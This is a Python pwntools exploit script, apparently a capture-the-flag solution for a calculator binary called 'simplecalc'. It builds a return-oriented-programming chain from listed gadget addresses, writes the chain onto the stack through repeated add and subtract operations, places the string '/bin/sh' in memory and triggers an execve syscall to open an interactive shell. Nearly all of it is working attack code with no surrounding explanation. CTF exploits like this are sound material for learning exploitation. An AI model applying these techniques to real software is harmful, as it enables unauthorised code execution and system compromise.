from pwn import *

# requirements for syscall
# rdi = addr to /bin/sh
# rax = 0x3b
# rsi = 0x0
# rdx = 0x0

# gadgets
# 0x004648e5: syscall
# 0x00401b73: pop rdi; ret
# 0x00401c87: pop rsi; ret
# 0x00437a85: pop rdx; ret
# 0x0044db34: pop rax; ret

# stack-layout
# random val : 0x40 + 8
# pop rdi; ret		0x00401b73
# addr to /bin/sh	0x006c4ab0
# pop rsi; ret		0x00401c87
# 0x0			0x00000000
# pop rdx; ret		0x00437a85
# 0x0			0x00000000
# pop rax; ret	        0x0044db34
# 0x3b			0x0000003b
# syscall		0x004648e5

# last:
# 0x6e69622f - 0x68732f2f

try:
    import sys
    if sys.argv[1] == "remote":
        conn = remote('localhost', 12121)
except:
    conn = process("/tmp/simplecalc")
    
def recvmenu():
    conn.recvuntil("=> ")

def interact(opt, x, y):
    recvmenu()
    conn.sendline(str(opt))
    conn.recvuntil("x: ")
    conn.sendline(str(x))
    conn.recvuntil("y: ")
    conn.sendline(str(y))
    x = conn.recvline()
    log.info(x[x.find('x'):-2] + " == " + hex(int(x[:-2].split()[-1])))

def writeval_64(x):
    num = [x & 0xffffffff, (x >> 32) & 0xffffffff]
    for i in range(2):
        if num[i] - 0x30 < 0x30:
            interact (2, num[i] + 0x30, 0x30)
        else:
            interact (1, num[i] - 0x30, 0x30)
    
conn.recvuntil("Expected number of calculations: ")
conn.sendline("57")

for i in range(9):
    writeval_64 (0x0)

writeval_64 (0x00401b73)
writeval_64 (0x006c4ab0)
writeval_64 (0x00401c87)
writeval_64 (0x00000000)
writeval_64 (0x00437a85)
writeval_64 (0x00000000)
writeval_64 (0x0044db34)
writeval_64 (0x0000003b)
writeval_64 (0x004648e5)

interact(2, 0x6e69622f, 0x68732f2f)
recvmenu()
conn.sendline('5')

conn.interactive()
conn.close()
